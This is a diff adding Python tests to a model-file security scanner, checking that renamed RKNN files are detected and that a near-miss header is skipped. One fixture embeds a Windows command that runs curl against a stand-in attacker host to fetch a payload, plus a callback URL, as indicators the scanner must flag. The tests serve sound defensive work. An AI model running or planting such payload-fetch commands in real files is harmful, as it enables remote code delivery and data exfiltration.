@@ -10,6 +10,7 @@ from modelaudit import core
 from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
 from modelaudit.scanners.rknn_scanner import RknnScanner
+from modelaudit.utils.file.detection import detect_file_format
 
 
 def _write_rknn_file(tmp_path: Path, payload: bytes, filename: str = "model.rknn") -> Path:
@@ -236,6 +237,36 @@ def test_regression_rknn_routes_to_dedicated_scanner(tmp_path: Path) -> None:
     result = core.scan_file(str(path))
     assert result.scanner_name == "rknn"
     assert result.scanner_name != "unknown"
+
+
+def test_renamed_rknn_routes_and_detects_correlated_indicators(tmp_path: Path) -> None:
+    payload = (
+        b"RKNN\x01\x00\x00\x00"
+        b"notes=cmd.exe /c curl https://evil.example/payload\n"
+        b"callback=http://198.51.100.5:8080/collect\n"
+    )
+    path = _write_rknn_file(tmp_path, payload, filename="payload.jpg")
+
+    assert RknnScanner.can_handle(str(path))
+    assert detect_file_format(str(path)) == "rknn"
+
+    direct = core.scan_file(str(path))
+    assert direct.scanner_name == "rknn"
+    assert any(check.severity == IssueSeverity.CRITICAL for check in direct.checks)
+
+    directory = core.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+    assert directory.files_scanned == 1
+    assert "rknn" in directory.scanner_names
+
+
+def test_renamed_rknn_near_match_remains_skipped(tmp_path: Path) -> None:
+    path = _write_rknn_file(tmp_path, b"RKNX\x01\x00\x00\x00model_name=demo\n", filename="notes.jpg")
+
+    assert not RknnScanner.can_handle(str(path))
+    assert detect_file_format(str(path)) == "unknown"
+
+    directory = core.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+    assert directory.files_scanned == 0
 
 
 def test_false_positive_high_entropy_blob_is_not_critical(tmp_path: Path) -> None:
